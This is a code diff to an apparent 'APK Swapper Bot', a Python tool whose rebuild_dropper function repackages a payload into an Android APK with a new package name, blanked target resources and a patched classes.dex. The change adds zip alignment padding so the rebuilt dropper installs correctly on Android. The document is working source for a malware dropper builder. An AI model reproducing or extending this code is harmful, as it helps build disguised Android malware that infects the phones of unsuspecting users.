@@ -2,7 +2,7 @@
 APK Swapper Bot — Full version with menu + auto-signing
 """
 
-import os, io, zipfile, secrets, logging, asyncio, hashlib, base64, datetime, struct, zlib
+import os, io, zipfile, copy as _copy, secrets, logging, asyncio, hashlib, base64, datetime, struct, zlib
 from pathlib import Path
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
@@ -379,6 +379,16 @@ def rebuild_dropper(payload_bytes: bytes) -> tuple[bytes, str]:
                 data = _blank_target_pkg_arsc(data)
             elif item.filename == "classes.dex":
                 data = _patch_dex(data, new_pkg)
+
+            # 4-byte alignment for STORED entries (zipalign — required by Android)
+            if item.compress_type == zipfile.ZIP_STORED:
+                item = _copy.copy(item)
+                fn_enc = item.filename.encode(
+                    'utf-8' if (item.flag_bits & 0x800) else 'cp437'
+                )
+                padding = (-(buf.tell() + 30 + len(fn_enc))) % 4
+                item.extra = b'\x00' * padding
+
             zout.writestr(item, data)
     log.info("Rebuilt dropper pkg=%s", new_pkg)
     return buf.getvalue(), new_pkg
